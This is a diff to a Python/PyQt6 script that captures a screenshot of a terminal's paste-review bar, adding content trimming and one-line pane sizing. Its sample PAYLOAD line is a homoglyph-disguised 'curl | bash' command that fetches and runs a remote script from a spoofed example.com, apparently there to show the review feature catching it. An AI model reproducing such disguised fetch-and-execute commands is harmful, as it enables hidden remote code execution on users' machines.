@@ -35,7 +35,8 @@ import sys
 os.environ.setdefault('QT_QPA_PLATFORM', 'offscreen')
 
 from PyQt6.QtWidgets import QApplication, QWidget, QVBoxLayout   # noqa: E402
-from PyQt6.QtGui import QPalette, QColor                         # noqa: E402
+from PyQt6.QtGui import QImage, QPainter, QPalette, QColor       # noqa: E402
+from PyQt6.QtCore import Qt                                      # noqa: E402
 
 from secure_terminal.review import ReviewBar               # noqa: E402
 from secure_terminal.sanitize import THEMES                # noqa: E402
@@ -55,6 +56,26 @@ PAYLOAD = ('curl -fsSL https://ex\u0430mple.com/get.sh | b\u0430sh\u200b'
 # A non-zero countdown so the shot shows both send buttons disabled and counting
 # down -- the anti-fat-finger gate, visible.
 COUNTDOWN_SECONDS = 4
+
+# Uniform frame kept around the content after trimming (px). The ReviewBar's
+# preview panes have a 130px minimum height (review.py setMinimumSize) but the
+# shot's payload is one line, so Qt reserves a screenful of empty pane below the
+# text. Grabbing the widget verbatim bakes that in as dead white space; instead
+# the grab is trimmed to the pixels that actually differ from the window
+# background and re-padded with this margin on every side, so the shot is tight
+# and framed consistently with the other top-level shots. Small enough to read as
+# a snug card, large enough not to crowd the content.
+MARGIN = 12
+
+# Vertical padding kept inside each preview pane, around its single line of text
+# (px). The panes carry a 130px minimum height (review.py) and default (auto)
+# scrollbars sized for a multi-line paste; the shot's payload is ONE line, so the
+# app leaves a screenful of empty pane -- rendered as bare white space or, when
+# the pane font overflows the pane width, a horizontal scrollbar along the
+# bottom. For the shot each pane is instead sized to its one line with scrollbars
+# off, so the panes read as tight cards. The live app is untouched -- its 130px
+# minimum is right for a real multi-line paste.
+PANE_INSET = 6
 
 
 class _Term:
@@ -89,6 +110,52 @@ def _theme_palette(app):
     app.setPalette(pal)
 
 
+def _trim_to_content(image, bg, margin):
+    """Crop `image` to the bounding box of pixels that differ from the window
+    background `bg`, then re-pad with a uniform `margin` on every side.
+
+    The ReviewBar reserves a fixed-minimum pane height regardless of content, so
+    a one-line payload leaves a screenful of empty pane; this removes it. A pure,
+    deterministic function of the pixels (a fixed background-difference threshold
+    and a fixed margin), so re-running yields byte-identical output. Erring wide
+    is safe: the threshold can only classify a pixel as content, never delete it.
+    """
+    image = image.convertToFormat(QImage.Format.Format_RGB32)
+    width, height = image.width(), image.height()
+    bg_r, bg_g, bg_b = bg.red(), bg.green(), bg.blue()
+    tol = 8   # absorb the anti-alias fringe against the flat background
+    bits = image.constBits()
+    bits.setsize(image.sizeInBytes())
+    buf = memoryview(bits)
+    stride = image.bytesPerLine()
+    min_x, min_y, max_x, max_y = width, height, -1, -1
+    for y in range(height):
+        row = buf[y * stride:y * stride + width * 4]
+        for x in range(width):
+            i = x * 4
+            # Format_RGB32 is little-endian BGRx in memory.
+            if (abs(row[i] - bg_b) > tol or abs(row[i + 1] - bg_g) > tol
+                    or abs(row[i + 2] - bg_r) > tol):
+                if x < min_x:
+                    min_x = x
+                if x > max_x:
+                    max_x = x
+                if y < min_y:
+                    min_y = y
+                if y > max_y:
+                    max_y = y
+    if max_x < 0:
+        return image        # all background; nothing to trim
+    content = image.copy(min_x, min_y, max_x - min_x + 1, max_y - min_y + 1)
+    out = QImage(content.width() + 2 * margin, content.height() + 2 * margin,
+                 QImage.Format.Format_RGB32)
+    out.fill(bg)
+    painter = QPainter(out)
+    painter.drawImage(margin, margin, content)
+    painter.end()
+    return out
+
+
 def main(argv):
     if not 2 <= len(argv) <= 3 or (len(argv) == 3 and argv[2] not in ('paste', 'copy')):
         sys.stderr.write('usage: %s <output.png> [paste|copy]\n' % argv[0])
@@ -109,6 +176,14 @@ def main(argv):
     layout.addWidget(bar)
     bar.show_review(_Term(), PAYLOAD, delay, kind)
     bar._detail_btn.setChecked(True)        # expand the preview panes for the shot
+    # The panes hold ONE line (PAYLOAD is one line); size each to that line and
+    # drop the auto scrollbars so the shot has no dead pane height and no stray
+    # scrollbar. Overrides the app's 130px minimum for the shot only.
+    for view in bar._views:
+        view.setVerticalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
+        view.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
+        view.setMinimumHeight(0)
+        view.setFixedHeight(view.fontMetrics().lineSpacing() + 2 * PANE_INSET)
     # width sized so the four preview panes + the button row are roomy and NOT
     # clipped on the right (a hard 940 truncated them; the word-wrapping summary
     # let the layout compress below the content's real width).
@@ -119,12 +194,17 @@ def main(argv):
     app.processEvents()
     app.processEvents()
 
-    pixmap = host.grab()
-    if not pixmap.save(out, 'PNG'):
+    # Trim the fixed-minimum empty pane height off the grab so the shot is tight
+    # and consistent with the other top-level shots (no dead white space below
+    # the one-line payload), keeping a uniform margin. THEMES is the theme source
+    # of truth, so the trim background matches what was rendered.
+    image = _trim_to_content(host.grab().toImage(), QColor(THEMES[THEME_NAME][0]),
+                             MARGIN)
+    if not image.save(out, 'PNG'):
         sys.stderr.write('failed to write %s\n' % out)
         return 1
     sys.stderr.write('wrote %s (%dx%d)\n'
-                     % (out, pixmap.width(), pixmap.height()))
+                     % (out, image.width(), image.height()))
     return 0
 
 
